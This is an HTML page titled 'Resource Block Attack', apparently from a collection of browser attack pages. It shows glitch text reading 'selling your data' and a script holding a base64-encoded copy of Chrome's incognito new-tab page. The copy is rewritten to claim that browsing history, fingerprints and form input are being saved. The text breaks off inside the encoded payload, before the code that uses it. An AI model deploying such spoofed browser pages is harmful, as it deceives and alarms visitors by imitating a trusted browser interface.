<html>
<head>
<meta charset="UTF-8">
<title>Resource Block Attack</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
<link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Press+Start+2P'>
<style type="text/css">
.frame {
  display: flex;
  align-items: center;
  justify-content: center;
  height: 100vh;
}
h2 {
  font-family: 'Press Start 2P', cursive;
  font-size: 8vw;
}
span {
  display: block;
  -webkit-animation-duration: 0.3s;
          animation-duration: 0.3s;
  -webkit-animation-timing-function: steps(3);
          animation-timing-function: steps(3);
  -webkit-animation-iteration-count: infinite;
          animation-iteration-count: infinite;
}
.one {
  -webkit-transform: translate(0, 0);
          transform: translate(0, 0);
  color: #ffdead;
  -webkit-animation-name: glitchtext;
          animation-name: glitchtext;
}
.two {
  margin-top: -1em;
  color: #db7093;
  mix-blend-mode: darken;
  -webkit-animation-name: glitchtext1;
          animation-name: glitchtext1;
}
.three {
  margin-top: -1em;
  color: #00ced1;
  mix-blend-mode: color-burn;
  -webkit-animation-name: glitchtext2;
          animation-name: glitchtext2;
}
@-webkit-keyframes glitchtext {
  0% {
    -webkit-transform: translate(1px, 10px);
            transform: translate(1px, 10px);
  }
  30% {
    -webkit-transform: translate(5px, 1px);
            transform: translate(5px, 1px);
  }
  70% {
    -webkit-transform: translate(7px, 0px);
            transform: translate(7px, 0px);
  }
  100% {
    -webkit-transform: translate(10px, 8px);
            transform: translate(10px, 8px);
  }
}
@keyframes glitchtext {
  0% {
    -webkit-transform: translate(1px, 10px);
            transform: translate(1px, 10px);
  }
  30% {
    -webkit-transform: translate(5px, 1px);
            transform: translate(5px, 1px);
  }
  70% {
    -webkit-transform: translate(7px, 0px);
            transform: translate(7px, 0px);
  }
  100% {
    -webkit-transform: translate(10px, 8px);
            transform: translate(10px, 8px);
  }
}
@-webkit-keyframes glitchtext1 {
  0% {
    -webkit-transform: translate(8px, 10px);
            transform: translate(8px, 10px);
  }
  30% {
    -webkit-transform: translate(7px, 6px);
            transform: translate(7px, 6px);
  }
  70% {
    -webkit-transform: translate(4px, 9px);
            transform: translate(4px, 9px);
  }
  100% {
    -webkit-transform: translate(8px, 4px);
            transform: translate(8px, 4px);
  }
}
@keyframes glitchtext1 {
  0% {
    -webkit-transform: translate(8px, 10px);
            transform: translate(8px, 10px);
  }
  30% {
    -webkit-transform: translate(7px, 6px);
            transform: translate(7px, 6px);
  }
  70% {
    -webkit-transform: translate(4px, 9px);
            transform: translate(4px, 9px);
  }
  100% {
    -webkit-transform: translate(8px, 4px);
            transform: translate(8px, 4px);
  }
}
@-webkit-keyframes glitchtext2 {
  0% {
    -webkit-transform: translate(4px, 9px);
            transform: translate(4px, 9px);
  }
  30% {
    -webkit-transform: translate(1px, 3px);
            transform: translate(1px, 3px);
  }
  70% {
    -webkit-transform: translate(0px, 2px);
            transform: translate(0px, 2px);
  }
  100% {
    -webkit-transform: translate(1px, 3px);
            transform: translate(1px, 3px);
  }
}
@keyframes glitchtext2 {
  0% {
    -webkit-transform: translate(4px, 9px);
            transform: translate(4px, 9px);
  }
  30% {
    -webkit-transform: translate(1px, 3px);
            transform: translate(1px, 3px);
  }
  70% {
    -webkit-transform: translate(0px, 2px);
            transform: translate(0px, 2px);
  }
  100% {
    -webkit-transform: translate(1px, 3px);
            transform: translate(1px, 3px);
  }
}
</style>
</head>
<body>
<div class="frame">
<h2><span class="one">Enjoy!</span><span class="two">Enjoy!</span><span class="three">Enjoy!</span></h2><h3 style="font-family: 'Press Start 2P', cursive;">selling your data.</h3>
</div>
<script>
function trigger() {
	var content = "PCFkb2N0eXBlIGh0bWw+DQo8aHRtbCBkaXI9Imx0ciINCmhhc2N1c3RvbWJhY2tncm91bmQ9ImZhbHNlIg0KYm9va21hcmtiYXJhdHRhY2hlZD0iZmFsc2UiDQpsYW5nPSJlbiINCmNsYXNzPSJtZCI+DQo8aGVhZD4NCjxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4NCjx0aXRsZT5OZXcgVGFiPC90aXRsZT4NCjxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgiPg0KPHN0eWxlPg0KQGltcG9ydCB1cmwoaHR0cDovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9Um9ib3RvKTsNCmh0bWwgew0KICBkaXJlY3Rpb246IGx0cjsNCn0NCmJvZHkgew0KICBmb250LWZhbWlseTogUm9ib3RvLCAnU2Vnb2UgVUknLCBUYWhvbWEsIHNhbnMtc2VyaWY7DQogIGZvbnQtc2l6ZTogODEuMjUlOw0KICBiYWNrZ3JvdW5kLWNvbG9yOiByZ2IoNTAsIDU0LCA1Nyk7DQp9DQpidXR0b24gew0KICBmb250LWZhbWlseTogUm9ib3RvLCAnU2Vnb2UgVUknLCBUYWhvbWEsIHNhbnMtc2VyaWY7DQp9DQoNCmJvZHkgew0KLXdlYmtpdC1mb250LXNtb290aGluZzogYW50aWFsaWFzZWQ7DQpmb250LXNpemU6IDEwMCU7DQptYXJnaW46IDA7DQp9DQouY29udGVudCB7DQpiYWNrZ3JvdW5kLWNvbG9yOiByZ2IoNTAsIDU0LCA1Nyk7DQpjb2xvcjogcmdiKDIzMiwgMjM0LCAyMzcpOw0KZm9udC1zaXplOiBjYWxjKDEwMCUgLSAycHgpOw0KbGluZS1oZWlnaHQ6IGNhbGMoMTAwJSArIDZweCk7DQptaW4td2lkdGg6IDI0MHB4Ow0KfQ0KaDEgew0KZm9udC1zaXplOiBjYWxjKDEwMCUgKyA4cHgpOw0KZm9udC13ZWlnaHQ6IDQwMDsNCmxpbmUtaGVpZ2h0OiBjYWxjKDEwMCUgKyA4cHgpOw0KfQ0KZW0gew0KY29sb3I6IHdoaXRlOw0KZm9udC1zdHlsZTogbm9ybWFsOw0KfQ0KLmxlYXJuLW1vcmUtYnV0dG9uIHsNCmNvbG9yOiByZ2IoMTM4LCAxODAsIDI0OCk7DQp0ZXh0LWRlY29yYXRpb246IG5vbmU7DQp9DQpAbWVkaWEgKG1heC13aWR0aDogMjQwcHgpLA0KKG1heC1oZWlnaHQ6IDMyMHB4KSB7DQouY29udGVudCB7DQpmb250LXNpemU6IGNhbGMoMTAwJSAtIDRweCk7DQpsaW5lLWhlaWdodDogY2FsYygxMDAlICsgNnB4KTsNCn0NCmgxIHsNCmZvbnQtc2l6ZTogY2FsYygxMDAlICsgNHB4KTsNCmxpbmUtaGVpZ2h0OiBjYWxjKDEwMCUgKyA0cHgpOw0KfQ0KfQ0KLmljb24gew0KY29udGVudDogdXJsKGRhdGE6aW1hZ2Uvc3ZnK3htbDtiYXNlNjQsUEhOMlp5QjRiV3h1Y3owaWFIUjBjRG92TDNkM2R5NTNNeTV2Y21jdk1qQXdNQzl6ZG1jaUlIWnBaWGRDYjNnOUlqQWdNQ0F5TkRBZ01qUXdJajQ4WnlCdmNHRmphWFI1UFNJdU9DSWdabWxzYkQwaUkwWkdSaUkrUEhCaGRHZ2daRDBpVFRFeU1TQXdRelV6TGprdExqWXRMallnTlRNdU9TQXdJREV5TVdNdU5pQTJOUzR5SURVekxqZ2dNVEU0TGpRZ01URTVJREV4T1NBMk55NHhMallnTVRJeExqWXROVE11T1NBeE1qRXRNVEl4UXpJek9TNDBJRFV6TGpnZ01UZzJMakl1TmlBeE1qRWdNSHBOT1RBdU5TQTFPV011TXkwdU9TQXhMVEV1TlNBeUxqSXRNUzR5SURJdU1pNDFJREU1TGprZ05DNHpJREU1TGprZ05DNHpjek0yTGpndE5TNDJJRE00TGpFdE5TNDVZekV1TVMwdU1pQXhMamt1TkNBeUxqRWdNUzQwTGpFdU5DQTJMak1nTWpFdU15QXhNUzQzSURNNUxqVklOemd1TTBNNE15NDVJRGM1TGpZZ09UQXVNU0EyTUNBNU1DNDFJRFU1ZW0wNE5TNDVJREV3TXk0ell5MHVPQ0F4TWk0eUxURXdMamNnTWpJdU1TMHlNaTQ1SURJeUxqa3RNVFF1TXk0NUxUSTJMakV0TVRBdU5DMHlOaTR4TFRJMExqVWdNQzB1TnlBd0xURXVOQzR4TFRJdU1TMHlMUzQzTFRRdU1pMHhMVFl1TkMweExUSXVNeUF3TFRRdU5TNDBMVFl1TnlBeExqRXVNUzQzTGpFZ01TNHpMakVnTWlBd0lERTBMakV0TVRFdU9DQXlOUzQwTFRJMkxqRWdNalF1TlMweE1pNHlMUzQ0TFRJeUxqRXRNVEF1TnkweU1pNDVMVEl5TGprdExqZ3RNVFF1TWlBeE1DNDFMVEkyTGpFZ01qUXVOUzB5Tmk0eElERXdMaklnTUNBeE9TQTJMak1nTWpJdU55QXhOUzR5SURJdU55MHVPQ0ExTGpVdE1TNHpJRGd1TkMweExqTWdNaTQ0SURBZ05TNDFMalFnT0M0eElERXVNaUF6TGpjdE9DNDVJREV5TGpRdE1UVXVNU0F5TWk0M0xURTFMakVnTVRRdU1TQXdJREkxTGpRZ01URXVPU0F5TkM0MUlESTJMakY2YlRJekxqUXRNelF1TTBnME1pNDBZeTB1TWlBd0xTNHpMUzR6TFM0eExTNDBJRFV1TWkweUxqY2dNelV1TkMweE55NDJJRGM1TFRFM0xqWWdORE11TnlBd0lEY3pMalVnTVRRdU9DQTNPQzQySURFM0xqWXVNaTR4TGpFdU5DMHVNUzQwZWlJdlBqeGphWEpqYkdVZ1kzZzlJakUxTVM0NUlpQmplVDBpTVRZd0xqZ2lJSEk5SWpFM0xqUWlMejQ4WTJseVkyeGxJR040UFNJNU1DNHhJaUJqZVQwaU1UWXdMamdpSUhJOUlqRTNMalFpTHo0OEwyYytQQzl6ZG1jKyk7DQpoZWlnaHQ6IDEyMHB4Ow0Kd2lkdGg6IDEyMHB4Ow0KfQ0KQG1lZGlhIChtYXgtaGVpZ2h0OiA0ODBweCksDQoobWF4LXdpZHRoOiA3MjBweCkgew0KLmljb24gew0KaGVpZ2h0OiA3MnB4Ow0Kd2lkdGg6IDcycHg7DQp9DQp9DQpAbWVkaWEgKG1heC13aWR0aDogNzIwcHgpIHsNCkBtZWRpYSAobWF4LXdpZHRoOiAyNDBweCksDQoobWF4LWhlaWdodDogNDgwcHgpIHsNCi5pY29uIHsNCmhlaWdodDogNDhweDsNCndpZHRoOiA0OHB4Ow0KfQ0KfQ0KfQ0KLmNvbnRlbnQgPiAubGVhcm4tbW9yZS1idXR0b24gew0KZGlzcGxheTogbm9uZTsNCn0NCkBtZWRpYSAobWF4LXdpZHRoOiA3MjBweCkgew0KI3N1YnRpdGxlID4gLmxlYXJuLW1vcmUtYnV0dG9uIHsNCmRpc3BsYXk6IG5vbmU7DQp9DQouY29udGVudCA+IC5sZWFybi1tb3JlLWJ1dHRvbiB7DQpkaXNwbGF5OiBibG9jazsNCn0NCn0NCi5jb250ZW50IHsNCm1hcmdpbi1pbmxpbmUtZW5kOiBhdXRvOw0KbWFyZ2luLWlubGluZS1zdGFydDogYXV0bzsNCm1heC13aWR0aDogNjAwcHg7DQp9DQouaWNvbiB7DQptYXJnaW4taW5saW5lLWVuZDogYXV0bzsNCm1hcmdpbi1pbmxpbmUtc3RhcnQ6IGF1dG87DQp9DQpoMSB7DQp0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQojYnVsbGV0cG9pbnRzLXdyYXBwZXIgew0KZGlzcGxheTogZmxleDsNCmZsZXgtd3JhcDogd3JhcDsNCmp1c3RpZnktY29udGVudDogc3BhY2UtYmV0d2VlbjsNCn0NCi5idWxsZXRwb2ludHMgew0KZmxleC1iYXNpczogMjg1cHg7DQpmbGV4LWdyb3c6IDE7DQpmbGV4LXNocmluazogMDsNCn0NCi5idWxsZXRwb2ludHMuZmlyc3Qgew0KbWFyZ2luLWlubGluZS1lbmQ6IDMwcHg7DQp9DQpAbWVkaWEgKG1heC13aWR0aDogNzIwcHgpIHsNCi5jb250ZW50IHsNCm1heC13aWR0aDogNjAwcHggIWltcG9ydGFudDsNCnRleHQtYWxpZ246IHN0YXJ0Ow0KfQ0KLmljb24gew0KbWFyZ2luLWlubGluZS1zdGFydDogMDsNCn0NCmgxIHsNCnRleHQtYWxpZ246IHN0YXJ0Ow0KfQ0KfQ0KLmJ1bGxldHBvaW50cyB1bCB7DQptYXJnaW46IDRweCAwIDA7DQpwYWRkaW5nLWlubGluZS1zdGFydDogMTZweDsNCn0NCkBtZWRpYSAobWluLXdpZHRoOiA3MjBweCkgew0KLmljb24sDQpoMSwNCiNzdWJ0aXRsZSwNCi5sZWFybi1tb3JlLWJ1dHRvbiB7DQptYXJnaW4tdG9wOiAxLjVyZW07DQp9DQouaWNvbiwNCmgxLA0KI3N1YnRpdGxlLA0KLmJ1bGxldHBvaW50cyB7DQptYXJnaW4tYm90dG9tOiAxLjVyZW07DQp9DQouY29udGVudCB7DQptYXJnaW4tdG9wOiA0MHB4Ow0KbWluLXdpZHRoOiAyNDBweDsNCnBhZGRpbmc6IDhweCA0OHB4IDI0cHg7DQp9DQpAbWVkaWEgKG1heC1oZWlnaHQ6IDQ4MHB4KSB7DQpodG1sLA0KYm9keSwNCi5jb250ZW50IHsNCmhlaWdodDogMTAwJTsNCn0NCi5jb250ZW50IHsNCm1hcmdpbi1ib3R0b206IDA7DQptYXJnaW4tdG9wOiAwOw0KcGFkZGluZy1ib3R0b206IDA7DQpwYWRkaW5nLXRvcDogMDsNCn0NCi5pY29uIHsNCm1hcmdpbi10b3A6IDA7DQpwYWRkaW5nLXRvcDogMzJweDsNCn0NCn0NCkBtZWRpYSAobWF4LWhlaWdodDogMzIwcHgpIHsNCmgxLA0KI3N1YnRpdGxlIHsNCm1hcmdpbi1ib3R0b206IDE2cHg7DQptYXJnaW4tdG9wOiAxNnB4Ow0KfQ0KDQoubGVhcm4tbW9yZS1idXR0b24sDQouYnVsbGV0cG9pbnRzLA0KLmljb24gew0KbWFyZ2luLWJvdHRvbTogMTZweDsNCn0NCn0NCn0NCkBtZWRpYSAobWF4LXdpZHRoOiA3MjBweCkgew0KLmNvbnRlbnQgew0KbWluLXdpZHRoOiAxNzZweDsNCnBhZGRpbmc6IDcycHggMzJweDsNCn0NCi5pY29uLA0KaDEsDQojc3VidGl0bGUgew0KbWFyZ2luLWJvdHRvbTogMS41cmVtOw0KbWFyZ2luLXRvcDogMS41cmVtOw0KfQ0KDQouYnVsbGV0cG9pbnRzLA0KLmxlYXJuLW1vcmUtYnV0dG9uIHsNCm1hcmdpbi1ib3R0b206IDEuNXJlbTsNCn0NCkBtZWRpYSAobWF4LWhlaWdodDogNjAwcHgpIHsNCi5jb250ZW50IHsNCnBhZGRpbmctdG9wOiA0OHB4Ow0KfQ0KLmljb24sDQpoMSwNCiNzdWJ0aXRsZSB7DQptYXJnaW4tYm90dG9tOiAxcmVtOw0KbWFyZ2luLXRvcDogMXJlbTsNCn0NCi5idWxsZXRwb2ludHMsDQoubGVhcm4tbW9yZS1idXR0b24gew0KbWFyZ2luLWJvdHRvbTogMXJlbTsNCn0NCn0NCkBtZWRpYSAobWF4LWhlaWdodDogNDgwcHgpIHsNCi5jb250ZW50IHsNCnBhZGRpbmctdG9wOiAzMnB4Ow0KfQ0KfQ0KLmljb24gew0KbWFyZ2luLXRvcDogMDsNCn0NCi5sZWFybi1tb3JlLWJ1dHRvbiB7DQptYXJnaW4tYm90dG9tOiAwOw0KfQ0KfQ0KQG1lZGlhIChtYXgtd2lkdGg6IDI0MHB4KSB7DQouY29udGVudCB7DQptaW4td2lkdGg6IDE5MnB4Ow0KcGFkZGluZy1pbmxpbmUtZW5kOiAyNHB4Ow0KcGFkZGluZy1pbmxpbmUtc3RhcnQ6IDI0cHg7DQp9DQp9DQo8L3N0eWxlPg0KPC9oZWFkPg0KPGJvZHk+DQo8ZGl2IGNsYXNzPSJjb250ZW50Ij4NCjxkaXYgY2xhc3M9Imljb24iIHJvbGU9InByZXNlbnRhdGlvbiIgYWx0PSIiPjwvZGl2Pg0KPGgxPllvdSd2ZSBnb25lIGluY29nbml0bywgYnV0IHlvdSdyZSBub3QgaGlkZGVuPC9oMT4NCjxwIGlkPSJzdWJ0aXRsZSI+DQo8c3Bhbj5Ob3cgeW91IGNhbiBicm93c2Ugb3Blbmx5LCB0aGUgd2hvbGUgd29ybGQgd2lsbCBzZWUgeW91ciBhY3Rpdml0eS4gT2J2aW91c2x5LCBldmVyeXRoaW5nIHdpbGwgYmUgc2F2ZWQuIDxhIGNsYXNzPSJsZWFybi1tb3JlLWJ1dHRvbiIgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tLzB4NDhwaXJhai9Qd25Ib3VzZS8jUHJpdmFjeSI+TGVhcm4gbW9yZTwvYT48L3NwYW4+DQo8L3A+DQo8ZGl2IGlkPSJidWxsZXRwb2ludHMtd3JhcHBlciI+DQo8ZGl2IGNsYXNzPSJidWxsZXRwb2ludHMgZmlyc3QiPldlIDxlbT53aWxsIHNhdmU8L2VtPiB0aGUgZm9sbG93aW5nIGluZm9ybWF0aW9uOg0KPHVsPg0KPGxpPllvdXIgYnJvd3NpbmcgaGlzdG9yeSAoRXRhZykNCjxsaT5BbGwgeW91ciBkYXRhIChicm93c2VyLWZpbmdlcnByaW50aW5nKQ0KPGxpPkluZm9ybWF0aW9uIGVudGVyZWQgaW4gZm9ybXMgKG1heWJlIG5vdCkNCjwvdWw+PC9kaXY+DQo8ZGl2IGNsYXNzPSJidWxsZXRwb2ludHMiPllvdXIgYWN0aXZpdHkgPGVtPmlzIHN0aWxsIHZpc2libGU8L2VtPiB0bzoNCjx1bD4NCjxsaT5Vcywgbm90IFUuUy4sIG9yIG1heWJlIC4uLg0KPGxpPkV2ZXJ5IGNvbXBhbnkgeW91IGNhbiB0aGluayBvZi4NCjxsaT5CYXNpY2FsbHkgdGhlIHdob2xlIGludGVybmV0DQo8L3VsPjwvZGl2Pg0KPC9kaXY+DQo8YSBjbGFzcz0ibGVhcm4tbW9yZS1idXR0b24iIGhyZWY9Imh0dHBzOi8vc3VwcG9ydC5nb29nbGUuY29tL2Nocm9tZS8/cD1pbmNvZ25pdG8iPkxlYXJuIG1vcmU8L2E+DQo8L2Rpdj4NCjxzY3JpcHQ+DQp2YXIgV2ViVUlMaXN0ZW5lcjsNCnZhciBjciA9IGNyIHx8IGZ1bmN0aW9uKGdsb2JhbCkgew0KICAndXNlIHN0cmljdCc7DQogIGZ1bmN0aW9uIGV4cG9ydFBhdGgobmFtZSwgb3B0X29iamVjdCwgb3B0X29iamVjdFRvRXhwb3J0VG8pIHsNCiAgICBjb25zdCBwYXJ0cyA9IG5hbWUuc3BsaXQoJy4nKTsNCiAgICBsZXQgY3VyID0gb3B0X29iamVjdFRvRXhwb3J0VG8gfHwgZ2xvYmFsOw0KDQogICAgZm9yIChsZXQgcGFydDsgcGFydHMubGVuZ3RoICYmIChwYXJ0ID0gcGFydHMuc2hpZnQoKSk7KSB7DQogICAgICBpZiAoIXBhcnRzLmxlbmd0aCAmJiBvcHRfb2JqZWN0ICE9PSB1bmRlZmluZWQpIHsNCiAgICAgICAgLy8gbGFzdCBwYXJ0IGFuZCB3ZSBoYXZlIGFuIG9iamVjdDsgdXNlIGl0DQogICAgICAgIGN1cltwYXJ0XSA9IG9wdF9vYmplY3Q7DQogICAgICB9IGVsc2UgaWYgKHBhcnQgaW4gY3VyKSB7DQogICAgICAgIGN1ciA9IGN1cltwYXJ0XTsNCiAgICAgIH0gZWxzZSB7DQogICAgICAgIGN1ciA9IGN1cltwYXJ0XSA9IHt9Ow0KICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gY3VyOw0KICB9DQogIGZ1bmN0aW9uIGRpc3BhdGNoUHJvcGVydHlDaGFuZ2UodGFyZ2V0LCBwcm9wZXJ0eU5hbWUsIG5ld1ZhbHVlLCBvbGRWYWx1ZSkgew0KICAgIGNvbnN0IGUgPSBuZXcgRXZlbnQocHJvcGVydHlOYW1lICsgJ0NoYW5nZScpOw0KICAgIGUucHJvcGVydHlOYW1lID0gcHJvcGVydHlOYW1lOw0KICAgIGUubmV3VmFsdWUgPSBuZXdWYWx1ZTsNCiAgICBlLm9sZFZhbHVlID0gb2xkVmFsdWU7DQogICAgdGFyZ2V0LmRpc3BhdGNoRXZlbnQoZSk7DQogIH0NCiAgZnVuY3Rpb24gZ2V0QXR0cmlidXRlTmFtZShqc05hbWUpIHsNCiAgICByZXR1cm4ganNOYW1lLnJlcGxhY2UoLyhbQS1aXSkvZywgJy0kMScpLnRvTG93ZXJDYXNlKCk7DQogIH0NCiAgY29uc3QgUHJvcGVydHlLaW5kID0gew0KICAgIEpTOiAnanMnLA0KICAgIEFUVFI6ICdhdHRyJywNCiAgICBCT09MX0FUVFI6ICdib29sQXR0cicNCiAgfTsNCiAgZnVuY3Rpb24gZ2V0R2V0dGVyKG5hbWUsIGtpbmQpIHsNCiAgICBsZXQgYXR0cmlidXRlTmFtZTsNCiAgICBzd2l0Y2ggKGtpbmQpIHsNCiAgICAgIGNhc2UgUHJvcGVydHlLaW5kLkpTOg0KICAgICAgICBjb25zdCBwcml2YXRlTmFtZSA9IG5hbWUgKyAnXyc7DQogICAgICAgIHJldHVybiBmdW5jdGlvbigpIHsNCiAgICAgICAgICByZXR1cm4gdGhpc1twcml2YXRlTmFtZV07DQogICAgICAgIH07DQogICAgICBjYXNlIFByb3BlcnR5S2luZC5BVFRSOg0KICAgICAgICBhdHRyaWJ1dGVOYW1lID0gZ2V0QXR0cmlidXRlTmFtZShuYW1lKTsNCiAgICAgICAgcmV0dXJuIGZ1bmN0aW9uKCkgew0KICAgICAgICAgIHJldHVybiB0aGlzLmdldEF0dHJpYnV0ZShhdHRyaWJ1dGVOYW1lKTsNCiAgICAgICAgfTsNCiAgICAgIGNhc2UgUHJvcGVydHlLaW5kLkJPT0xfQVRUUjoNCiAgICAgICAgYXR0cmlidXRlTmFtZSA9IGdldEF0dHJpYnV0ZU5hbWUobmFtZSk7DQogICAgICAgIHJldHVybiBmdW5jdGlvbigpIHsNCiAgICAgICAgICByZXR1cm4gdGhpcy5oYXNBdHRyaWJ1dGUoYXR0cmlidXRlTmFtZSk7DQogICAgICAgIH07DQogICAgfQ0KICAgIHRocm93ICdub3QgcmVhY2hlZCc7DQogIH0NCiAgZnVuY3Rpb24gZ2V0U2V0dGVyKG5hbWUsIGtpbmQsIG9wdF9zZXRIb29rKSB7DQogICAgbGV0IGF0dHJpYnV0ZU5hbWU7DQogICAgc3dpdGNoIChraW5kKSB7DQogICAgICBjYXNlIFByb3BlcnR5S2luZC5KUzoNCiAgICAgICAgY29uc3QgcHJpdmF0ZU5hbWUgPSBuYW1lICsgJ18nOw0KICAgICAgICByZXR1cm4gZnVuY3Rpb24odmFsdWUpIHsNCiAgICAgICAgICBjb25zdCBvbGRWYWx1ZSA9IHRoaXNbbmFtZV07DQogICAgICAgICAgaWYgKHZhbHVlICE9PSBvbGRWYWx1ZSkgew0KICAgICAgICAgICAgdGhpc1twcml2YXRlTmFtZV0gPSB2YWx1ZTsNCiAgICAgICAgICAgIGlmIChvcHRfc2V0SG9vaykgew0KICAgICAgICAgICAgICBvcHRfc2V0SG9vay5jYWxsKHRoaXMsIHZhbHVlLCBvbGRWYWx1ZSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBkaXNwYXRjaFByb3BlcnR5Q2hhbmdlKHRoaXMsIG5hbWUsIHZhbHVlLCBvbGRWYWx1ZSk7DQogICAgICAgICAgfQ0KICAgICAgICB9Ow0KDQogICAgICBjYXNlIFByb3BlcnR5S2luZC5BVFRSOg0KICAgICAgICBhdHRyaWJ1dGVOYW1lID0gZ2V0QXR0cmlidXRlTmFtZShuYW1lKTsNCiAgICAgICAgcmV0dXJuIGZ1bmN0aW9uKHZhbHVlKSB7DQogICAgICAgICAgY29uc3Qgb2xkVmFsdWUgPSB0aGlzW25hbWVdOw0KICAgICAgICAgIGlmICh2YWx1ZSAhPT0gb2xkVmFsdWUpIHsNCiAgICAgICAgICAgIGlmICh2YWx1ZSA9PSB1bmRlZmluZWQpIHsNCiAgICAgICAgICAgICAgdGhpcy5yZW1vdmVBdHRyaWJ1dGUoYXR0cmlidXRlTmFtZSk7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICB0aGlzLnNldEF0dHJpYnV0ZShhdHRyaWJ1dGVOYW1lLCB2YWx1ZSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAob3B0X3NldEhvb2spIHsNCiAgICAgICAgICAgICAgb3B0X3NldEhvb2suY2FsbCh0aGlzLCB2YWx1ZSwgb2xkVmFsdWUpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZGlzcGF0Y2hQcm9wZXJ0eUNoYW5nZSh0aGlzLCBuYW1lLCB2YWx1ZSwgb2xkVmFsdWUpOw0KICAgICAgICAgIH0NCiAgICAgICAgfTsNCg0KICAgICAgY2FzZSBQcm9wZXJ0eUtpbmQuQk9PTF9BVFRSOg0KICAgICAgICBhdHRyaWJ1dGVOYW1lID0gZ2V0QXR0cmlidXRlTmFtZShuYW1lKTsNCiAgICAgICAgcmV0dXJuIGZ1bmN0aW9uKHZhbHVlKSB7DQogICAgICAgICAgY29uc3Qgb2xkVmFsdWUgPSB0aGlzW25hbWVdOw0KICAgICAgICAgIGlmICh2YWx1ZSAhPT0gb2xkVmFsdWUpIHsNCiAgICAgICAgICAgIGlmICh2YWx1ZSkgew0KICAgICAgICAgICAgICB0aGlzLnNldEF0dHJpYnV0ZShhdHRyaWJ1dGVOYW1lLCBuYW1lKTsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgIHRoaXMucmVtb3ZlQXR0cmlidXRlKGF0dHJpYnV0ZU5hbWUpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKG9wdF9zZXRIb29rKSB7DQogICAgICAgICAgICAgIG9wdF9zZXRIb29rLmNhbGwodGhpcywgdmFsdWUsIG9sZFZhbHVlKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGRpc3BhdGNoUHJvcGVydHlDaGFuZ2UodGhpcywgbmFtZSwgdmFsdWUsIG9sZFZhbHVlKTsNCiAgICAgICAgICB9DQogICAgICAgIH07DQogICAgfQ0KDQogICAgdGhyb3cgJ25vdCByZWFjaGVkJzsNCiAgfQ0KDQogIGZ1bmN0aW9uIGRlZmluZVByb3BlcnR5KG9iaiwgbmFtZSwgb3B0X2tpbmQsIG9wdF9zZXRIb29rKSB7DQogICAgaWYgKHR5cGVvZiBvYmogPT0gJ2Z1bmN0aW9uJykgew0KICAgICAgb2JqID0gb2JqLnByb3RvdHlwZTsNCiAgICB9DQoNCiAgICBjb25zdCBraW5kID0gKG9wdF9raW5kIHx8IFByb3BlcnR5S2luZC5KUyk7DQoNCiAgICBpZiAoIW9iai5fX2xvb2t1cEdldHRlcl9fKG5hbWUpKSB7DQogICAgICBvYmouX19kZWZpbmVHZXR0ZXJfXyhuYW1lLCBnZXRHZXR0ZXIobmFtZSwga2luZCkpOw0KICAgIH0NCg0KICAgIGlmICghb2JqLl9fbG9va3VwU2V0dGVyX18obmFtZSkpIHsNCiAgICAgIG9iai5fX2RlZmluZVNldHRlcl9fKG5hbWUsIGdldFNldHRlcihuYW1lLCBraW5kLCBvcHRfc2V0SG9vaykpOw0KICAgIH0NCiAgfQ0KDQogIGxldCB1aWRDb3VudGVyID0gMTsNCg0KICBmdW5jdGlvbiBjcmVhdGVVaWQoKSB7DQogICAgcmV0dXJuIHVpZENvdW50ZXIrKzsNCiAgfQ0KDQogIGZ1bmN0aW9uIGRpc3BhdGNoU2ltcGxlRXZlbnQodGFyZ2V0LCB0eXBlLCBvcHRfYnViYmxlcywgb3B0X2NhbmNlbGFibGUpIHsNCiAgICBjb25zdCBlID0gbmV3IEV2ZW50KHR5cGUsIHsNCiAgICAgIGJ1YmJsZXM6IG9wdF9idWJibGVzLA0KICAgICAgY2FuY2VsYWJsZTogb3B0X2NhbmNlbGFibGUgPT09IHVuZGVmaW5lZCB8fCBvcHRfY2FuY2VsYWJsZQ0KICAgIH0pOw0KICAgIHJldHVybiB0YXJnZXQuZGlzcGF0Y2hFdmVudChlKTsNCiAgfQ0KDQogIGZ1bmN0aW9uIGRlZmluZShuYW1lLCBmdW4pIHsNCiAgICBjb25zdCBvYmogPSBleHBvcnRQYXRoKG5hbWUpOw0KICAgIGNvbnN0IGV4cG9ydHMgPSBmdW4oKTsNCiAgICBmb3IgKGNvbnN0IHByb3BlcnR5TmFtZSBpbiBleHBvcnRzKSB7DQogICAgICBjb25zdCBwcm9wZXJ0eURlc2NyaXB0b3IgPQ0KICAgICAgICAgIE9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoZXhwb3J0cywgcHJvcGVydHlOYW1lKTsNCiAgICAgIGlmIChwcm9wZXJ0eURlc2NyaXB0b3IpIHsNCiAgICAgICAgT2JqZWN0LmRlZmluZVByb3BlcnR5KG9iaiwgcHJvcGVydHlOYW1lLCBwcm9wZXJ0eURlc2NyaXB0b3IpOw0KICAgICAgfQ0KICAgIH0NCiAgfQ0KDQogIGZ1bmN0aW9uIGFkZFNpbmdsZXRvbkdldHRlcihjdG9yKSB7DQogICAgY3Rvci5nZXRJbnN0YW5jZSA9IGZ1bmN0aW9uKCkgew0KICAgICAgcmV0dXJuIGN0b3IuaW5zdGFuY2VfIHx8IChjdG9yLmluc3RhbmNlXyA9IG5ldyBjdG9yKCkpOw0KICAgIH07DQogIH0NCiAgY29uc3QgY2hyb21lU2VuZFJlc29sdmVyTWFwID0ge307DQoNCiAgZnVuY3Rpb24gd2ViVUlSZXNwb25zZShpZCwgaXNTdWNjZXNzLCByZXNwb25zZSkgew0KICAgIGNvbnN0IHJlc29sdmVyID0gY2h